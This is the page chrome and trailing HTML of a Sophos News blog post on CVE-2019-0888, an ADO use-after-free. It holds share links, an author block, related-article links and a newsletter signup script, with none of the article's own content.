				<span class="sr-only">Share on Facebook</span>
				<svg
					width="8"
					height="16"
					xmlns="http://www.w3.org/2000/svg"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M7.145 8.006H4.903V16H1.581V8.006H0V5.182h1.581V3.354C1.581 2.045 2.202 0 4.933 0l2.461.01v2.742H5.608c-.291 0-.705.145-.705.77v1.66h2.533l-.291 2.824z" fill-rule="nonzero"/>
				</svg>
		</a>
	</li>
	<li class="twitter">
		<a
			class="js-share-modal"
			href="http://twitter.com/intent/tweet?text=CVE-2019-0888%3A%20Use-After-Free%20in%20Windows%20ActiveX%20Data%20Objects%20%28ADO%29%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D57686"
			data-title=""
			title="Share on Twitter">
				<span class="sr-only">Share on Twitter</span>
				<svg
					width="14"
					height="13"
					xmlns="http://www.w3.org/2000/svg"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M12.567 3.238c.007.141.01.281.01.424 0 4.338-2.89 9.34-8.173 9.34-1.623 0-3.132-.543-4.403-1.475.225.03.453.045.685.045 1.346 0 2.584-.523 3.566-1.404-1.255-.028-2.317-.977-2.682-2.28a2.56 2.56 0 001.296-.056C1.554 7.53.562 6.203.562 4.613v-.04c.389.245.83.392 1.302.41C1.094 4.393.587 3.387.587 2.25c0-.602.142-1.166.388-1.65 1.416 1.986 3.534 3.292 5.92 3.43a3.735 3.735 0 01-.074-.749c0-1.813 1.286-3.28 2.873-3.28.825 0 1.572.397 2.096 1.034a5.324 5.324 0 001.824-.797c-.215.768-.67 1.41-1.263 1.816a5.178 5.178 0 001.65-.515 6.362 6.362 0 01-1.434 1.7" fill-rule="nonzero"/>
				</svg>
		</a>
	</li>
	<li class="linkedin">
		<a
			href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/"
			data-title="CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)"
			title="Share on LinkedIn"
			onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;">
			<span class="sr-only">Share on LinkedIn</span>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M16 15.293h-3.43v-5.52c0-1.386-.496-2.334-1.738-2.334-.946 0-1.512.64-1.76 1.256-.09.22-.113.526-.113.836v5.762H5.53s.044-9.35 0-10.316h3.43v1.46c.456-.705 1.27-1.703 3.091-1.703 2.256 0 3.95 1.473 3.95 4.643v5.916zM1.917 3.566h-.022C.745 3.566 0 2.773 0 1.783 0 .772.768 0 1.94 0c1.173 0 1.896.772 1.917 1.783 0 .99-.744 1.783-1.94 1.783zM.202 15.293h3.431V4.977H.203v10.316z" fill-rule="nonzero"/>
			</svg>
		</a>
	</li>
	<li class="comments">
		<a
			href="#comments"
			title="Leave a Reply"
			class="flex items-center space-x-1"
		>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M8.5 0a7.5 7.5 0 11-3.916 13.898C3.317 15.273 1.773 15.36.256 15.135c1.011-1.185 1.678-2.357 2-3.517l-.007.027A7.5 7.5 0 018.5 0z" fill-rule="evenodd"/>
			</svg>
					</a>
	</li>
</ul>

			</div><!-- .entry-social -->
	</div>

</article><!-- #post-## -->

			<div class="container my-8 md:my-16">
				<div class="max-w-4xl mx-auto">
					<div class="article-author-block article-co-authors-block">
	
					<div class="author-block">
				<div class="author-block__profile">
					<img width="300" height="300" src="https://news.sophos.com/wp-content/uploads/2019/05/sophos-labs-logo.png?w=300" class="avatar avatar-400 photo wp-post-image" alt="SophosLabs" />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/7u7bdp6d/" title="Posts by SophosLabs Offensive Security" class="author url fn" rel="author">SophosLabs Offensive Security</a>						</h3>

						
							<div class="author-block__bio">
															</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
		
		</div>
				</div>
			</div>

			
<div class="pb-24 bg-white">
<div class="container">
<div class="max-w-5xl mx-auto">

			
			<h3 class="text-style-h2 md:my-8 my-4">
				Read Similar Articles			</h3>

			<div class="article-grid article-grid--3-column">
				<!-- Article -->
<article
	id="post-58306"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-58306 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-adobe tag-chakra tag-chakracore tag-edge tag-exploits tag-flash-player tag-hyper-v tag-microsoft tag-patch-tuesday tag-polar-bears tag-sandboxescaper tag-updates tag-vbscript tag-vulnerability tag-windows region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2019/06/11/patch-tuesday-squashes-89-bugs-including-a-sophoslabs-find/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2016/09/bug-bounty-google.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				June 11, 2019			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2019/06/11/patch-tuesday-squashes-89-bugs-including-a-sophoslabs-find/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">Patch Tuesday squashes 89 bugs-including a SophosLabs find</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-57782"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-57782 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-chakra tag-microsoft tag-patch-tuesday tag-rdp tag-remote-desktop-services tag-smb tag-update tag-windows region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2019/05/14/may-2019-patch-tuesday-addresses-critical-remote-desktop-dhcp-bugs/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2019/04/patch-tuesday.jpg?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 14, 2019			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2019/05/14/may-2019-patch-tuesday-addresses-critical-remote-desktop-dhcp-bugs/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">May, 2019 Patch Tuesday addresses critical remote desktop, DHCP bugs</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-57026"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-57026 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-cve-2018-18500 tag-exploit tag-firefox tag-mitigation tag-vulnerability region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2019/04/18/protected-cve-2018-18500-heap-write-after-free-in-firefox-analysis-and-exploitation/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2018/04/exploits-explained.jpg?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				April 18, 2019			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2019/04/18/protected-cve-2018-18500-heap-write-after-free-in-firefox-analysis-and-exploitation/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">CVE-2018-18500: write-after-free vulnerability in Firefox, Analysis and Exploitation</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
			</div>

	
</div>
</div>
</div> <!-- #secondary -->

			
<div class="bg-sophos-gray-50 px-4 pt-16 pb-8" id="comments">

	
	
	<div class="container max-w-2xl py-6 md:py-16">
			<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message" aria-hidden="true">Required fields are marked <span class="required" aria-hidden="true">*</span></span></p><p class="comment-form-comment"><label for="comment">Comment <span class="required" aria-hidden="true">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='57686' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="be5e5ce935" /></p><p style="display: none !important;"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="242"/><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
		</div>

</div><!-- #comments -->
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


	</div> <!-- #content -->

	

<div class="bg-sophos-gray-50 md:py-16 px-4" x-data="subscribeForm()">
	<div class="container max-w-2xl" x-show="!subscribed">
	<div class="text-style-h2-lg">
		Subscribe to get the latest updates in your inbox.	</div>
	<form action="">
		<div class="flex flex-col my-6">
		<input
			type="text"
			placeholder="name@email.com"
			class="w-full"
			x-model="email"
			x-on:keydown="resetErrors()"
			required
		/>
		<div
			x-cloak
			x-show="message"
			x-text="message"
			class="font-sansMedium px-4 py-3 mt-2 text-sm font-medium text-white bg-black border rounded-md"
		></div>
		</div>
		<div class="mb-4 text-lg">
			Which categories are you interested in?		</div>
		<div class="my-2 space-y-1">
		<template
			x-for="category in Object.entries(categories)"
			:key="category[0]"
		>
			<div>
			<label
				x-bind:for="category[1].value"
				class="inline-flex items-center"
			>
				<input
				type="checkbox"
				x-bind:value="category[1].value"
				x-bind:id="category[1].value"
				x-bind:name="category[1].value"
				x-model="subscribeTo"
				/>
				<span
				class="text-style-form-label ml-2"
				x-text="category[1].name"
				>
				</span>
			</label>
			</div>
		</template>
		</div>
		<div class="mt-6">
		<input
			type="submit"
			class="round-button round-button--primary"
			@click.prevent="submit()"
			x-bind:value="buttonText()"
			x-bind:class="{ 'opacity-30 cursor-not-allowed': buttonDisabled() }"
			x-bind:disabled="buttonDisabled()"
		/>
		</div>
	</form>
	</div>

	<div class="container max-w-2xl" x-cloak x-show="subscribed && !loading">
	<div class="text-style-h2 md:text-3xl mb-4 text-2xl text-center">
		You’re now subscribed!	</div>
	<div
		class="text-lg text-center"
		x-text="`Check your email to confirm your subscription.`"
	></div>
	</div>
</div>

<script>
	let subscribeForm = function () {
	return {
		config: {
		endpoints: {
			signup:
			"https://sophos-mailchimp-signup.netlify.app/.netlify/functions/newsletter-signup",
		},
		},
		subscribed: false,
		loading: false,
		error: false,
		message: "",
		categories: {
		1: {
			name: decodeURIComponent( 'Products%20and%20Services' ),
			value: "products-services",
		},
		2: {
			name: decodeURIComponent( 'Threat%20Research' ),
			value: "threat-research",
		},
		3: {
			name: decodeURIComponent( 'Security%20Operations' ),
			value: "security-operations",
		},
		4: {
			name: decodeURIComponent( 'AI%20Research' ),
			value: "ai-research",
		},
		5: {
			name: decodeURIComponent( '%23SophosLife' ),
			value: "sophos-life",
		},
		},
		subscribeTo: [],
		email: "",

		reset() {
		this.loading = false;
		if (!this.error) {
			this.email = "";
		}
		},

		resetErrors() {
		this.error = false;
		this.message = "";
		},

		setError(message) {
		this.error = true;
		this.message = message;
		},

		setSuccess(message) {
		this.error = false;
		this.message = message;
		},

		emailIsValid(email) {
		return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
		},

		submit() {
		this.loading = true;
		this.resetErrors();

		const mcList = "8d6471d831";
		const mcLanguage = decodeURIComponent( 'en' );
		const mcTags = [...this.subscribeTo, mcLanguage];

		const payload = {
			email: this.email,
			listId: mcList,
			tags: mcTags,
			language: mcLanguage,
		};

		fetch(this.config.endpoints.signup, {
			method: "POST",
			headers: {
			"Content-Type": "application/json",
			},
			body: JSON.stringify(payload),
		})
			.then((r) => r.json())
			.then((data) => {
			if (data.status === "pending") {
				this.setSuccess(
					decodeURIComponent( 'You%20have%20been%20subscribed.%20Please%20check%20your%20email%20to%20confirm.' )
				);
				this.subscribed = true;
			} else if (
				data.status === "subscribed"
			) {
				this.setSuccess(
					decodeURIComponent( 'You%20are%20already%20subscribed.%20Thank%20you%21' )
				);
			} else {
				this.setError(
					decodeURIComponent( 'We%20could%20not%20subscribe%20you.%20Please%20try%20again.' )
				);
			}
			})
			.catch((e) => {
			this.setError(
				decodeURIComponent( 'We%20could%20not%20subscribe%20you.%20Please%20try%20again.' )
			);
			})
			.finally(() => {
			this.reset();
			});
		},

		buttonText() {
		return this.loading ? decodeURIComponent( 'Please%20Wait' ) : decodeURIComponent( 'Subscribe' );
		},

		buttonDisabled() {
		return (
			this.subscribeTo.length < 1 ||
			!this.emailIsValid(this.email) ||
			this.loading
		);
		},
	};
	};
</script>


	<footer
		class="bg-white border-t border-sophos-gray-200 "
		x-data="{ languageMenu: false, privacyMenu: false, legalMenu: false }"
	>
		<div class="container">
			<div class="md:flex-row md:items-center flex flex-col justify-between py-8">
				<div class="flex items-baseline flex-grow space-x-6">
					<!-- Language -->
					
<div class="relative mr-auto">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="languageMenu = !languageMenu"
		@click.away="languageMenu = false"
	>
		Change Region		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': languageMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>

	<!-- Language Menu -->
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="languageMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
											<li>
					<a href="https://news.sophos.com/es-419">
						América Latina					</a>
				</li>
															<li>
					<a href="https://news.sophos.com/pt-br">
						Brasil					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/de-de">
						Deutschland					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/en-us">
						English					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/fr-fr">
						France					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/es-es">
						Iberia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/it-it">
						Italia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/ja-jp">
						Japan					</a>
				</li>
									</ul>
	</div>
</div>

					<!-- Terms -->
					<a
						href="https://www.sophos.com/en-us/legal/sophos-website.aspx"
						class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block ml-auto text-xs font-medium leading-tight"
						>Terms</a
					>

					<!-- Privacy -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="privacyMenu = !privacyMenu"
		@click.away="privacyMenu = false"
	>
		Privacy
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': privacyMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="privacyMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx"
				>
					Privacy Notice				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/cookie-information.aspx"
				>
					Cookies				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Legal -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="legalMenu = !legalMenu"
		@click.away="legalMenu = false"
	>
		Legal
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': legalMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="legalMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal.aspx"
				>
					General				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx"
				>
					Modern Slavery Statement				</a>
			</li>
			<li>
				<a
					href="https://secure.ethicspoint.eu/domain/media/en/gui/104916/index.html"
				>
					Speak Out				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Copyright -->
					<div class="md:ml-6 mt-2 md:mt-0">
						<span
							class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
						>
							&copy; 1997 - 2022 Sophos Ltd. All rights reserved						</span>
					</div>
				</div>
			</div>
			</div>
		</div>
	</footer>
	<script type="text/javascript" src="https://news.sophos.com/_static/??-eJzTLy/QTc7PK0nNK9EvyClNz8wr1i+uzCtJrMjITM/IAeKS1CJMEWP94uSizIISoOIM5/yiVL2sYh19yo1yKiotzghLoqZpLplpadQ0z7mgAGicfa6toZmphYkpEBplAQBh932t" ></script><script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://news.sophos.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://news.sophos.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['auto-links'] = false;
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	if ( typeof( jQuery ) !== 'undefined' ) {
		jQuery( function( $ ) {
			$( document.body ).on( 'post-load', function() {
				SyntaxHighlighter.highlight();
			} );
		} );
	}
</script>
<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJyVjGEOwiAMRi8kZRCn/jGehZBmA6UQWp3Ht2YXGOn36+W92q2ZWEmQxMqKBdlybWtlwo2Nn9zVZtapVJ8JzceDB6cAdgCZT/bQj1j7gI1f6YGP+zuCt6TXeBVDaSEtNBy20IWwD3dLGE7+TKNHubvLfDvPelP+AaC7oEI=" ></script><script src='https://cdn.jsdelivr.net/gh/alpinejs/alpine@v2.8.1/dist/alpine.min.js?ver=2.0.1' id='alpine-js-js'></script>
<script type="text/javascript" src="https://news.sophos.com/wp-includes/js/comment-reply.min.js?m=1658827588g" ></script><script src='https://stats.wp.com/e-202231.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:11.1.2',blog:'166161023',post:'57686',tz:'-4',srv:'news.sophos.com',hp:'vip'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '57686' ]);
</script>
</body>
</html>
